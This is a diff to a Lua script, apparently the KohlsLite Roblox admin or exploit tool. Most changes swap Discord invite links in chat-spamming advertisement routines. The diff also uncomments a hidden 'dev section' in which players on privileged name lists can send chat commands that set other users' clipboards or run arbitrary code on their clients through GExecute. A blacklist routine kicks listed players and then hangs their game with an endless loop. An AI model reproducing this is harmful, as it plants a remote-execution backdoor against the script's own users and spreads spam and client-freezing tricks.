@@ -3933,7 +3933,7 @@ Commands required: rocket]])
 		-- Chat(prefix.."unantimsg")
             	Chat("h \n\n\n get jebaited \n\n\n")
 		Chat("music 2665943889")
-		--  Chat(prefix.."byp dsc gg kohlslite")
+		--  Chat(prefix.."byp ")
            	Chat("fogcolor 0 0 0")
 		Chat("time 0")
 		Chat("fogend 0")
@@ -6607,11 +6607,11 @@ Commands required: rocket]])
 
     if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'discord' then
 		if setclipboard then
-			Remind("Clipboard set to invite.")
-			setclipboard("https://discord.gg/Q7Q7rAyckJ")
+			Remind("Clipboard set to my username on Discord.")
+			setclipboard("ts2021 (discord)")
 		else
-			Remind("Check console for invite.")
-			print("https://discord.gg/Q7Q7rAyckJ")
+			Remind("Check console for my username on Discord.")
+			print("ts2021 (discord)")
 		end
     end
 
@@ -8716,16 +8716,15 @@ function ADVERTISEMENT()
         task.wait(1)
         Speak("Get it at script blox: search CMD LITE")
         task.wait(1)
-        Speak("dm ts 2021 to join the kohlslite server or check the logs")
+        Speak("dm ts 2021 or check the logs")
         if haspersons == true then
-                Chat("m/ \n\n\n dsc gg kohlslite \n\n\n")
-                Chat("h/ \n\n\n dsc gg kohlslite \n\n\n")
-		Chat("ff dsc gg kohlslite")
+                Chat("m/ \n\n\n ts2021 \n\n\n")
+                Chat("h/ \n\n\n ts2021 \n\n\n")
+		Chat("ff ts2021 on discord")
         else
-                Chat("m \n\n\n dsc gg kohlslite \n\n\n")
-                Chat("h \n\n\n dsc gg kohlslite \n\n\n")
-		Chat("ff dsc gg kohlslite")
-
+                Chat("m \n\n\n ts2021 \n\n\n")
+                Chat("h \n\n\n ts2021 \n\n\n")
+		Chat("ff ts2021 on discord")
         end
 end
 
@@ -8734,14 +8733,14 @@ function CADVERTISEMENT()
         task.wait(1)
         Speak("dm ts 2021 to join the kah community server or check the logs")
         if haspersons == true then
-                Chat("m/ \n\n\n dsc gg kohlslite \n\n\n")
-                Chat("h/ \n\n\n dsc gg kohlslite \n\n\n")
-		Chat("ff dsc gg kohlslite")
+                Chat("m/ \n\n\n .gg / kah \n\n\n")
+                Chat("h/ \n\n\n .gg / kah \n\n\n")
+		Chat("ff discord.gg/kah")
 
         else
-                Chat("m \n\n\n dsc gg kohlslite \n\n\n")
-                Chat("h \n\n\n dsc gg kohlslite \n\n\n")
-		Chat("ff dsc gg kohlslite")
+                Chat("m \n\n\n .gg / kah \n\n\n")
+                Chat("h \n\n\n .gg / kah \n\n\n")
+		Chat("ff discord.gg/kah")
         end
 end
 
@@ -9014,7 +9013,7 @@ function PLRSTART(v)
                     end
 
                     -- // dev section \\ --
---[[
+
                     if string.sub(msg:lower(), 0, 4) == "-klc" and v.Name ~= game.Players.LocalPlayer.Name and table.find(specialperms, v.Name) then
                         if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                             Speak("I use KohlsLite!")
@@ -9029,7 +9028,7 @@ function PLRSTART(v)
 
                     if string.sub(msg:lower(), 0, 5) == "-clip" and v.Name ~= game.Players.LocalPlayer.Name and table.find(atprogperms, v.Name) then
                         if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
-                            setclipboard("https://discord.gg/Q7Q7rAyckJ")
+                            setclipboard("https://discord.gg/kah")
                         end
                     end
 
@@ -9101,7 +9100,7 @@ function PLRSTART(v)
                         if not table.find(specialperms, game.Players.LocalPlayer.Name) and not table.find(atprogperms, game.Players.LocalPlayer.Name) then
                             GExecute(string.sub(msg, 7))
                         end
-                    end ]]
+                    end
         	end)
 
             -- END OF DEV SECTION --
@@ -13753,10 +13752,10 @@ end
 local unexecuteables = {"Temporary123516","aliihsan12345Bloxy","XxSmurfXxSmurfXx","kjnjsknsdgkgnfgkjknf","NOTAVIRTUALMACHINE15"}
 if table.find(unexecuteables, game.Players.LocalPlayer.Name) then
 		if setclipboard then
-			setclipboard("https://discord.gg/Q7Q7rAyckJ")
+			setclipboard("dm ts2021	on discord")
 		end
                 pcall(function() -- thanks tech
-		        game.Players.LocalPlayer:Kick("[KohlsLite]: You have been blacklisted from KohlsLite. Join our Discord server - Q7Q7rAyckJ.") 
+		        game.Players.LocalPlayer:Kick("[KohlsLite]: You have been blacklisted from KohlsLite. Contact ts2021 to contest this.") 
                 end)
                 task.wait(2.5); while true do end
 end
